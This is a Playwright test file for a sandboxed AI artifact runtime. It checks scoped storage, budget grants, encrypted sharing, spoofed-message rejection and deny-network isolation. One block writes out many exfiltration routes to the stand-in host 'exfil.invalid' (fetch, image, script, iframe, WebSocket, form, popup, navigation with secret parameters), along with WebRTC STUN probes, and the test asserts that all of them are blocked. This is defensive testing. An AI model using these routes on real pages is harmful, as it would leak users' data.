import assert from 'node:assert/strict';
import { build } from 'esbuild';
import { mkdir, writeFile } from 'node:fs/promises';
import { resolve } from 'node:path';
import { chromium } from 'playwright';
import { parseArtifactLink, openArtifact } from './artifact-share.mjs';
import { artifactTestServer } from './artifact-test-server.mjs';
import dgram from 'node:dgram';

const evidence = resolve(process.env.EVIDENCE || 'local-data/artifacts');
await mkdir(evidence, { recursive: true });
const pi = resolve('node_modules/@earendil-works/pi-web-ui/dist');
const output = await build({ stdin: { contents: `
import {createArtifacts} from './artifacts.mjs'; import {ArtifactState} from './artifact-state.mjs'; import {sealArtifact,artifactLink} from './artifact-share.mjs';
const records = new Map(); window.records=records;
const state=new ArtifactState({dataKey:btoa(String.fromCharCode(...new Uint8Array(32).fill(7))),getRecord:scope=>records.get(scope),saveRecord:(scope,envelope)=>records.set(scope,envelope)});
const models={grant:async(scope,limit)=>{await state.update(scope,record=>{if(record.budget.limitNanoUsd!==null)throw Error('Already granted');record.budget.limitNanoUsd=limit});return (await state.read(scope)).budget},complete:async(scope,params)=>{const record=await state.read(scope);if(record.budget.limitNanoUsd===null)throw Object.assign(Error('Choose an app budget in the host bar'),{code:'NOT_AVAILABLE'});if(params.messages[0].content==='slow'){window.slowStarted=true;await new Promise(resolve=>setTimeout(resolve,31000))}return {text:'answer:'+params.messages[0].content,model:'test-model',usage:{},evidence:{}}}};
const x=createArtifacts(undefined,{state,models,share:async html=>{const sealed=await sealArtifact(html);window.shareCiphertext=sealed.ciphertext;return artifactLink(sealed)},credit:{address:'public-wallet',signer:{privateKey:'NEVER_EXPOSE'},chatCredit:{remainingNanoUsd:'100000000',spentNanoUsd:'1'}},scopeForFilename:filename=>JSON.stringify(['chat-a',filename])});document.body.append(x.budgetBar,x.shareBar,x.panel);window.artifacts=x;
`, resolveDir: process.cwd() }, bundle:true,format:'esm',write:false,alias:{'@pi-components':pi},loader:{'.md':'text'} });
const host='https://private-agent.dstack.soc1024.com', sandbox='https://artifacts.private-agent.dstack.soc1024.com';
const tls=await artifactTestServer({ mainHtml: `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self'; style-src 'unsafe-inline'; frame-src ${sandbox}"><body><script type="module" src="/test.js"></script>`, mainScript:output.outputFiles[0].text });
const udp=dgram.createSocket('udp4');let udpPackets=0;
udp.on('message',()=>udpPackets++);await new Promise(resolve=>udp.bind(0,'127.0.0.1',resolve));
const browser=await chromium.launch({headless:true,executablePath:process.env.CHROMIUM_PATH,args:['--no-sandbox',...tls.args]});
const page=await browser.newPage();
await page.clock.install();
const outgoing=[], errors=[];
page.on('pageerror', e=>errors.push(String(e)));
await page.route('**/*',async route=>{
  const url=route.request().url();
  if(url===host+'/'||url===host+'/test.js'||[sandbox+'/loader.html',sandbox+'/sandbox-sw.js',sandbox+'/native-loader.html'].includes(url))return route.continue();
  outgoing.push(url);return route.abort();
});
try {
  await page.goto(host+'/');await page.waitForFunction(()=>window.artifacts);
  const html=`<!doctype html><html><head><style>body{background:white;color:black}</style></head><body><parsererror hidden>&lt;img src="https://exfil.invalid/fallback"&gt;</parsererror><button id="count">0</button><form id="local-form"><input id="form-value"><button type="submit">Save locally</button></form><output id="form-result"></output><script>document.querySelector("form").onsubmit=async event=>{event.preventDefault();const value=document.querySelector("#form-value").value;await dsmack.storage.put("form-key",value);document.querySelector("#form-result").textContent=value};document.querySelector('button').onclick=e=>e.target.textContent=Number(e.target.textContent)+1;console.log('runtime-ready');</script></body></html>`;
  await page.evaluate(async html=>window.artifacts.tool.execute('create1',{command:'create',filename:'test.html',content:html}),html);
  let app;
  for (let attempt=0; attempt<100&&!app; attempt++) {
    for (const frame of page.frames()) if (frame.url().startsWith('blob:') && await frame.locator('#count').count().catch(()=>0)) app=frame;
    if (!app) await page.waitForTimeout(100);
  }
  if (!app) console.log(await Promise.all(page.frames().map(async frame => ({url:frame.url(),body:await frame.locator('body').innerText().catch(()=>'?')}))));
  assert.ok(app,'artifact renders in a blob iframe');
  const acknowledgement = await app.evaluate(() => Promise.race([
    window.sendRuntimeMessage({type:'console',method:'log',text:'acknowledgement-probe'}),
    new Promise((_,reject)=>setTimeout(()=>reject(new Error('Console acknowledgement missing after 2s')),2000)),
  ]));
  assert.equal(acknowledgement.success,true,'console request receives the source-bound host acknowledgement');
  await app.locator('#form-value').fill('LOCAL_FORM_STATE');
  await app.getByRole('button',{name:'Save locally'}).click();
  await app.waitForFunction(()=>document.querySelector('#form-result').textContent==='LOCAL_FORM_STATE');
  assert.equal(await app.evaluate(()=>dsmack.storage.get('form-key')),'LOCAL_FORM_STATE','preventDefault form handler can update scoped storage');
  const sdk = await app.evaluate(async () => {
    await dsmack.ready();
    await dsmack.storage.put('sdk-key',{secret:'BROWSER_ONLY_ARTIFACT_STATE'});
    await dsmack.diagnostics.log('sdk-diagnostics');
    let denied;
    try { await dsmack.agent.complete({messages:[{role:'user',content:'before-grant'}]}); } catch(error) { denied=error.code; }
    return {frozen:Object.isFrozen(dsmack)&&Object.isFrozen(dsmack.storage),hasStorage:dsmack.capabilities.has('storage.get'),
      value:await dsmack.storage.get('sdk-key'),keys:await dsmack.storage.list(),credit:await dsmack.credit.balance(),denied};
  });
  assert.ok(sdk.frozen&&sdk.hasStorage);
  assert.deepEqual(sdk.value,{secret:'BROWSER_ONLY_ARTIFACT_STATE'});
  assert.deepEqual(sdk.keys.sort(),['form-key','sdk-key']);
  assert.equal(sdk.denied,'NOT_AVAILABLE');
  assert.ok(!JSON.stringify(sdk.credit).includes('NEVER_EXPOSE'));
  assert.equal(await page.evaluate(()=>JSON.stringify([...records.values()]).includes('BROWSER_ONLY_ARTIFACT_STATE')),false);
  await page.getByRole('button',{name:'Allow app budget'}).click();
  await page.waitForFunction(()=>document.querySelector('.artifact-budget').textContent.includes('Limit $0.020000'));
  assert.match(await page.locator('.artifact-budget').textContent(),/Limit \$0\.020000/);
  assert.equal(await app.evaluate(async()=>(await dsmack.agent.complete({messages:[{role:'user',content:'after-grant'}]})).text),'answer:after-grant');
  await page.locator('[data-artifact-share]').click();
  await page.waitForFunction(()=>document.querySelector('[data-artifact-share-link]').value);
  const shareLink=await page.locator('[data-artifact-share-link]').inputValue();
  const parsed=parseArtifactLink(shareLink);
  const shared=await openArtifact({...parsed,ciphertext:await page.evaluate(()=>window.shareCiphertext)});
  assert.equal(shared.html,html);
  assert.ok(!JSON.stringify(shared).includes('BROWSER_ONLY_ARTIFACT_STATE'),'sharing excludes live storage and UI state');
  assert.equal(await app.evaluate(()=>typeof dsmack.share),'undefined','only trusted host UI can share');
  const slow=app.evaluate(()=>dsmack.agent.complete({messages:[{role:'user',content:'slow'}]}));
  await page.waitForFunction(()=>window.slowStarted);
  await page.clock.fastForward(31000);
  assert.equal((await slow).text,'answer:slow','model response survives the upstream Pi 30s timeout');
  await app.locator('#count').click();assert.equal(await app.locator('#count').textContent(),'1');
  await page.screenshot({path:resolve(evidence,'artifacts.png')});
  const logs=()=>page.evaluate(async()=>JSON.stringify(await window.artifacts.tool.execute('logs',{command:'logs',filename:'test.html'})));
  assert.match(await logs(),/runtime-ready/);
  assert.match(await logs(),/sdk-diagnostics/);
  await page.evaluate(()=>window.postMessage({sandboxId:'artifact-test.html',type:'console',method:'log',text:'forged-console'},'*'));
  await page.evaluate(()=>window.postMessage({sandboxId:'artifact-test.html',type:'dsmack-request',version:1,requestId:'spoof',method:'storage.put',params:{key:'unauthorized',value:true}},'*'));
  await page.evaluate(async()=>window.artifacts.tool.execute('create2',{command:'create',filename:'other.html',content:`<script>parent.parent.postMessage({sandboxId:'artifact-test.html',type:'console',method:'log',text:'forged-console'},'*');parent.postMessage({sandboxId:'artifact-test.html',type:'console',method:'log',text:'forged-console'},'*');</script>`}));
  await page.waitForTimeout(50);assert.doesNotMatch(await logs(),/forged-console/);
  const other=page.frames().find(f=>f.url().startsWith('blob:')&&f!==app);
  assert.equal(await other.evaluate(async()=>{await dsmack.ready();return dsmack.storage.get('sdk-key')}),null,'other filename cannot read this app state');
  assert.equal(await app.evaluate(()=>dsmack.storage.get('unauthorized')),null,'unbound host messages cannot mutate artifact state');
  for (const frame of page.frames()) if (frame.url().startsWith('blob:') && await frame.locator('#count').count()) app=frame;
  const denied=await page.evaluate(async()=>{try{await window.artifacts.tool.execute('svg',{command:'create',filename:'evil.svg',content:'<svg/>'});return false}catch{return true}});
  assert.ok(denied,'non-HTML never reaches the trusted parent renderer');
  const nativeRtcStates=await app.evaluate(async port=>{
    document.open();document.write('<body>After document replacement');document.close();
    const states=[];
    for(let i=0;i<3;i++){
      const pc=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:'+port}]});
      try{
        pc.createDataChannel('local-boundary-probe');await pc.setLocalDescription(await pc.createOffer());
        await pc.setRemoteDescription({type:'answer',sdp:pc.localDescription.sdp.replace('a=setup:actpass','a=setup:active').replace(/a=ice-ufrag:[^\r\n]+/,'a=ice-ufrag:remoteProbe').replace(/a=ice-pwd:[^\r\n]+/,'a=ice-pwd:01234567890123456789012345678901')});
        await pc.addIceCandidate({candidate:'candidate:1 1 udp 2130706431 127.0.0.1 '+port+' typ host',sdpMid:'0',sdpMLineIndex:0});
        await new Promise(resolve=>setTimeout(resolve,200));states.push(pc.iceConnectionState);
      }finally{pc.close()}
    }
    return states;
  },udp.address().port);
  assert.deepEqual(nativeRtcStates,['failed','failed','failed']);
  assert.equal(udpPackets,0,'native policy must block STUN and remote ICE traffic after document.write');
  // Every request below is a concrete exfiltration route. The HTTP CSP inherited
  // by the blob must block them before any request reaches the network handler.
  await app.evaluate(async ({sandbox})=>{
    document.open();document.write('<button id="after-write">After write</button>');document.close();
    fetch('https://exfil.invalid/fetch').catch(()=>{});
    const image=new Image();image.src='https://exfil.invalid/image';document.body.append(image);
    const script=document.createElement('script');script.src='https://exfil.invalid/script';document.head.append(script);
    const link=document.createElement('link');link.rel='stylesheet';link.href='https://exfil.invalid/css';document.head.append(link);
    const frame=document.createElement('iframe');frame.src='https://exfil.invalid/frame';document.body.append(frame);
    try{new WebSocket('wss://exfil.invalid/socket')}catch{}
    const form=document.createElement('form');form.action='https://exfil.invalid/form';document.body.append(form);form.submit();
    const sameOriginForm=document.createElement('form');sameOriginForm.action=sandbox+'/loader.html?form=must-not-leave';document.body.append(sameOriginForm);sameOriginForm.submit();
    window.open('https://exfil.invalid/popup');
    parent.postMessage({type:'open-external-url',url:'https://exfil.invalid/bridge'},'*');
    try{parent.location.href=sandbox+'/loader.html?secret=parent'}catch{}
    try{top.location.href=sandbox+'/loader.html?secret=top'}catch{}
    location.href=sandbox+'/loader.html?secret=must-not-leave';
  },{sandbox});
  await page.waitForTimeout(250);
  assert.deepEqual(outgoing,[],'deny network includes navigation back to the loader origin');
  assert.equal(page.frames().filter(f=>f.url()===sandbox+'/native-loader.html').length,2,'trusted loaders remain isolated');
  assert.deepEqual(errors,[]);
  const unsupportedContext=await browser.newContext({userAgent:'Mozilla/5.0 Chrome/151.0.0.0 Safari/537.36'});
  try{
    const unsupported=await unsupportedContext.newPage();await unsupported.goto(host+'/');await unsupported.waitForFunction(()=>window.artifacts);
    const result=await unsupported.evaluate(()=>artifacts.tool.execute('blocked',{command:'create',filename:'blocked.html',content:'<script>console.log("UNTRUSTED_CODE_RAN")</script>'}));
    assert.match(JSON.stringify(result),/App preview unavailable/);
    assert.doesNotMatch(JSON.stringify(result),/UNTRUSTED_CODE_RAN/);
    assert.equal(unsupported.frames().filter(frame=>frame.url().startsWith('blob:')).length,0);
  }finally{await unsupportedContext.close()}
  await writeFile(resolve(evidence,'results.json'),JSON.stringify({browser:browser.version(),runtime:true,console:true,sdk:true,encryptedStorage:true,budgetGrant:true,modelResponseBeyond30s:true,spoofBlocked:true,htmlOnly:true,networkBlocked:true,nativeRtcStates,udpPackets,unsupportedBlocked:true,outgoing,errors},null,2));
  console.log('Artifact runtime, console source binding, HTML-only renderer and deny-network boundaries passed');
} finally {await browser.close();udp.close();await tls.close();}
